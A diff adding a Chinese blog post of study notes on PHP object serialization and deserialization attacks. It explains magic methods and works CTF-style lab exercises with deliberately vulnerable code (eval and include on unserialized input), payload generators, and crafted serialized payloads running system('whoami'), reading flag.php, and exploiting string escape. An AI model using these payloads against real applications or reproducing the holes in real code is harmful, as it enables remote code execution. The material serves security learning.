@@ -73,6 +73,221 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-serialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/23/serialize/" class="article-date">
+  <time class="dt-published" datetime="2024-02-23T08:43:19.000Z" itemprop="datePublished">2024-02-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/23/serialize/">serialize</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>类</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  var $name;</span><br><span class="line">  var $sex;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>类中包括成员变量，成员函数（方法），和py里面类的概念相似。</p>
+<p>类的实例化和赋值:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  var $name;</span><br><span class="line">  var $sex;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $var1.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zc= new hero();</span><br><span class="line">$zc-&gt;name=&#x27;zhangsan&#x27;;</span><br><span class="line">$zc-&gt;sex=&#x27;man&#x27;;</span><br><span class="line">$zc-&gt;action(&#x27;zuofan&#x27;);</span><br><span class="line">print_r($zc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhangsan</span><br><span class="line">zuofan</span><br><span class="line">hero Object ( [name] =&gt; zhangsan [sex] =&gt; man ) </span><br></pre></td></tr></table></figure>
+
+<p>权限修饰符：</p>
+<p>PHP访问权限修饰符有三种：1、Public（全局可用），2、Protected（自身可用），3、private（自身子类可用）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  public  $name=&#x27;zhangsan&#x27;;</span><br><span class="line">  private  $sex=&#x27;man&#x27;;</span><br><span class="line">  protected  $shengao=&#x27;185&#x27;;</span><br><span class="line">  function action($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zc= new hero();</span><br><span class="line">echo $zc-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $zc-&gt;sex.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $zc-&gt;shengao.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangsan</span><br><span class="line">Fatal error: Cannot access private property hero::$sex in C:\phpstudy_pro\WWW\pp\pp\class03\3.php on line 14</span><br></pre></td></tr></table></figure>
+
+<p><strong>序列化</strong></p>
+<p>序列化目的是便于数据传输</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TEST &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public $data2 = &quot;dazzhuang&quot;;</span><br><span class="line">    private $pass;</span><br><span class="line"></span><br><span class="line">    public function __construct($data, $pass)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">        $this-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = 34;</span><br><span class="line">$str = &#x27;user&#x27;;</span><br><span class="line">$bool = true;</span><br><span class="line">$null = NULL;</span><br><span class="line">$arr = array(&#x27;a&#x27; =&gt; 10, &#x27;b&#x27; =&gt; 200);</span><br><span class="line">$test = new TEST(&#x27;uu&#x27;, true);</span><br><span class="line">$test2 = new TEST(&#x27;uu&#x27;, true);</span><br><span class="line">$test2-&gt;data = &amp;$test2-&gt;data2;</span><br><span class="line">echo serialize($number).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($str).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($bool).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($null).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($arr).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($test).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo serialize($test2).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">i:34;</span><br><span class="line">s:4:&quot;user&quot;;</span><br><span class="line">b:1;</span><br><span class="line">N;</span><br><span class="line">a:2:&#123;s:1:&quot;a&quot;;i:10;s:1:&quot;b&quot;;i:200;&#125;</span><br><span class="line">O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:5:&quot;data2&quot;;s:9:&quot;dazzhuang&quot;;s:10:&quot;TESTpass&quot;;b:1;&#125;</span><br><span class="line">O:4:&quot;TEST&quot;:3:&#123;s:4:&quot;data&quot;;s:9:&quot;dazzhuang&quot;;s:5:&quot;data2&quot;;R:2;s:10:&quot;TESTpass&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = array(&#x27;benben&#x27;,&#x27;dazhuang&#x27;,&#x27;laoliu&#x27;);</span><br><span class="line">echo $a[0];</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">benbena:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhuang&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line">O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>private属性变量，会在其前面和后面各加上%00，且还要加上类的名字</p>
+<p>protect属性变量，会在其前面加上%00*%00</p>
+<p><strong>反序列化</strong></p>
+<p>序列化只转化对象，因此反序列化后类里面只有对象，没有方法</p>
+<p>例题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$get = $_GET[&quot;benben&quot;];</span><br><span class="line">$b = unserialize($get);</span><br><span class="line">$b-&gt;displayVar() ;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>_GET传递序列化后的test类，把$a改称想执行的命令，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:17:&quot;system(&quot;whoami&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>魔术方法</strong></p>
+<p>__constract():构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法.</p>
+<p>__destract():析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo x1.&quot;&lt;br /&gt;&quot; ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User();</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">unserialize($ser);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">x1</span><br><span class="line">x1</span><br></pre></td></tr></table></figure>
+
+<p> 在 PHP 中，当对象被反序列化后，即使在序列化的数据中没有包含对象的魔术方法（比如_destruct(）)，PHP 仍然会尝试调用这些魔术方法。这是因为在反序列化的过程中，PHP 会尝试恢复对象的完整状态，包括其方法。 这个过程会生成两个不同的 $test 对象实例。在程序结束时，PHP 会自动回收所有未被引用的对象，并调用其析构函数进行清理操作。因此，在示例代码中，当脚本执行结束时，PHP 会自动销毁这两个$test对象实例，并分别调用它们的析构函数 __destruct()。</p>
+<hr>
+<p>__sleep():在对象被序列化时触发,此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    public function __construct($username, $nickname, $password)    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);</span><br><span class="line">echo serialize($user);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>__wakeup():在对象被反序列化时触发，预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($user_ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125; </span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>__Tostring():echo或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发ToString()</p>
+<p>__invoke():把类当成函数调用时触发</p>
+<hr>
+<p>__call():调用的不存在的方法的名称和参数时触发，两个参数传参，返回不存在的方法的名称和参数</p>
+<p>__callStatic():静态调用或调用成员常量时使用的方法不存在时触发,两个参数传参，返回不存在的方法的名称和参数</p>
+<p>__get():给不存在的成员属性赋值时触发，一个参数,返回不存在的成员属性的名称</p>
+<p>__set():给不存在的成员属性赋值时触发,两个参数，返回不存在的成员属性名称和赋的值</p>
+<p>__isset():对不可访问属性使用 isset() 或 empty() 时，isset() 会被调用，一个参数，不可访问的成员属性的名称，不存在成员也可触发</p>
+<p>__unset():对不可访问属性使用 unset()时,其他同上</p>
+<p>__clone():当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 clone() </p>
+<hr>
+<p><strong>POP例题01</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class index &#123;</span><br><span class="line">    private $test;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;test = new normal();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class normal &#123;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        echo &quot;please attack me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;as&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>目标是调用eval语句，eval-&gt;$test2,还要把test2赋值</li>
+<li>eval在action方法里面，要调用该方法要用到__destruct()</li>
+<li>index里面存在__construct()会使$this-&gt;test &#x3D; new normal();这点要避免，不过代码里面也没有序列化步骤，就无所谓了</li>
+<li>先序列化再传入</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class index &#123;</span><br><span class="line">    private $test;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;test = new evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2 = &quot;system(&#x27;whuami&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new index());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;index&quot;:1:&#123;s:11:&quot;indextest&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:17:&quot;system(&#x27;whuami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>*test是private，别忘了%00，因为是get’方式，会自动编码，不用多余操作了</p>
+<p>为啥出问题了捏…思考…</p>
+<p>whuami O.o?</p>
+<p>原来因为whuami…</p>
+<hr>
+<p> <strong>魔术方法触发规则</strong></p>
+<p>魔术方法触发前提是：魔术方法所在的类(或对象)被调用 </p>
+<hr>
+<h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>在反序列化中，我们可以控制的数据就是对象中的属性值(<strong>成员变量</strong>),<br>所以在php反序列化中有一种漏洞利用方法叫”<strong>面向属性编程</strong>“，<br><strong>pop链</strong>就是利用<strong>魔术方法</strong>在里面进行<strong>多次跳转</strong>然后获取<strong>敏感数据</strong>的一种payload。</p>
+<hr>
+<h4 id="POC链"><a href="#POC链" class="headerlink" title="POC链"></a>POC链</h4><p><strong>POC</strong>(全程:Proof of concept)中午译为<strong>概念验证</strong>。在安全界可以理解为漏洞验证程序。POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。</p>
+<hr>
+<p><strong>POP例题02</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function append($value)</span><br><span class="line">    &#123;</span><br><span class="line">        include($value);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>目标：echo$flag，需要用到append方法</li>
+<li>触发__invoke，调用append，使$var&#x3D;flag.php</li>
+<li>__invoke的条件是把对象当成函数使用，发现底下存在return $function（）</li>
+<li>$function的值会在__get里面被赋值为$p</li>
+<li>因为要触发__invoke(),$p只能被赋值为invoke()所在的类Modifier</li>
+<li>__get（）的条件是调用不存在的成员属性</li>
+<li>return $this-&gt;str-&gt;source; 将$str赋值为get（）所在的类，因为其中不存在source，就会触发get（）</li>
+<li>完成第七点需要触发__tostring，条件是把对象当成字符串调用</li>
+<li>echo $this-&gt;source;这行代码正好和__tostring（）处于同一类里面，把$source赋值为自身所处的Show类即可</li>
+<li>触发echo需要满足__wakeup（）的条件，直接把这个反序列化即可.ovo</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var = &#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">$mod = new Modifier();</span><br><span class="line">$test = new Test();</span><br><span class="line">$test -&gt; p = $mod;</span><br><span class="line">$show = new Show();</span><br><span class="line">$show -&gt; str = $test;</span><br><span class="line">$show -&gt; source = $show;</span><br><span class="line">echo serialize($show);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot;%00Modifier%00var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一哈，var是个private对象，记得加上%00</p>
+<p>成功惹ovo</p>
+<hr>
+<p><strong>字符串逃逸</strong></p>
+<p><strong>反序列化分隔符：</strong><br>反序列化以;}结束，后面的字符串不影响正常的反序列化<br><strong>属性逃逸：</strong><br>一般数据先经过一次<strong>serialize</strong>再经过<strong>unserialize</strong>，在这个中间反序列化的<strong>字符串变多</strong>或者<strong>变少</strong>的时候有可能存在反序列化<strong>属性逃逸</strong>。 </p>
+<p><strong>逃逸例题01</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($name)&#123;</span><br><span class="line">    $safe=array(&quot;flag&quot;,&quot;php&quot;);</span><br><span class="line">    $name=str_replace($safe,&quot;hack&quot;,$name);</span><br><span class="line">    return $name;</span><br><span class="line">&#125;</span><br><span class="line">class test&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass=&#x27;daydream&#x27;;</span><br><span class="line">    function __construct($user)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$param=$_GET[&#x27;param&#x27;];</span><br><span class="line">$param=serialize(new test($param));</span><br><span class="line">$profile=unserialize(filter($param));</span><br><span class="line"></span><br><span class="line">if ($profile-&gt;pass==&#x27;escaping&#x27;)&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>由replace语句，会把flag,php替换为flag，因为flag和hack都是4字母，无法逃逸，所以应该用php替换，长度会增多，每个php增多一个</li>
+<li>需要将pass赋值为escaping</li>
+<li>目标：O:4”test”:2:{S:4:”user”;N;S:4:”pass”;S:8:”escaping”;}</li>
+<li>“;S:4:”pass”;S:8:”escaping”;}占位29位，所以需要php*29</li>
+<li>param&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;S:4:”pass”;S:8:”escaping”;}成功</li>
+</ol>
+<hr>
+<p><strong>__wakeup魔术方法绕过</strong></p>
+<p>漏洞产生原因:<br>如果存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数大于真实属性个数时，会跳过__wakeup()的执行</p>
+<p><strong>绕过例题01</strong></p>
